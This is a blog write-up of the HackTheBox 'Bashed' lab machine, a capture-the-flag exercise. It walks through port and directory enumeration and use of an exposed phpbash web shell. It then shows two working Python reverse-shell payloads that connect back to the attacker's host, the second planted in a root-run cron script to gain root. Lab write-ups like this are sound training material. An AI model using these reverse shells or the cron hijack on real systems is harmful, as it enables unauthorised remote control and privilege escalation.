---
layout: post
title: HackTheBox - Bashed write-up
categories: CTF
---
Nmap TCP scan result:
```
Nmap scan report for 10.10.10.68
Host is up (0.016s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```
<!--more-->
Blog on port 80:
{:refdef: style="text-align: center;"}
![](/images/47d31f3e5fbe4508ad6dd828fd43711a.png)
{: refdef}
Blog article showcases something that looks like a web shell.

`gobuster` output:
```
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/images (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/config.php (Status: 200)
/fonts (Status: 301)
/server-status (Status: 403)
```

`/dev` contains two files:
{:refdef: style="text-align: center;"}
![](/images/4b8846e200514818853e4df1170d4e4b.png)
{: refdef}

Indeed, `phpbash` *is* a web shell:
{:refdef: style="text-align: center;"}
![](/images/fb5cff8c2fe8438eac5cf2720b36c091.png)
{: refdef}

Standard `sudo -l` check succeeds:
```
www-data@bashed:/dev/shm# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Let's upgrade to the reverse shell. I issue the following one-liner in the webshell:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
and catch the reverse shell with `nc -lvnp 1337` on my Kali machine.

```
k-lazarev@kali:~/bin/LinEnum$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.68] 44086
bash: cannot set terminal process group (751): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/dev/shm$ sudo -u scriptmanager bash
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```
Now I can execute commands as `scriptmanager`. Time to look around:

```
ls -la /
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
drwxr-xr-x  19 root          root           4240 Aug 24 18:55 dev
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 115 root          root              0 Aug 24 18:55 proc
drwx------   3 root          root           4096 Dec  4  2017 root
drwxr-xr-x  18 root          root            500 Aug 24 18:55 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Aug 24 18:55 sys
drwxrwxrwt  10 root          root           4096 Aug 24 20:11 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```
`/scripts` directory looks promising:

```
ls -la /scripts
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Aug 24 20:14 test.txt
```

`test.py` contents:
```
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```
Looks like `test.txt` was modified recently, but *before* I spawned the vulnerable box, which is odd. On closer inspection I notice that the time zone on Bashed is different from mine, and `test.txt` is getting modified every minute. Likely, there's a scheduled job which runs `test.py` as `root`. In the next step I replace `test.py` contents with my reverse shell:

```
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.13",1338))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```
After catching the reverse shell I gain `root` access:
{:refdef: style="text-align: center;"}
![](/images/eff94e939a7249c1bf5ce14b466fc37f.png)
{: refdef}
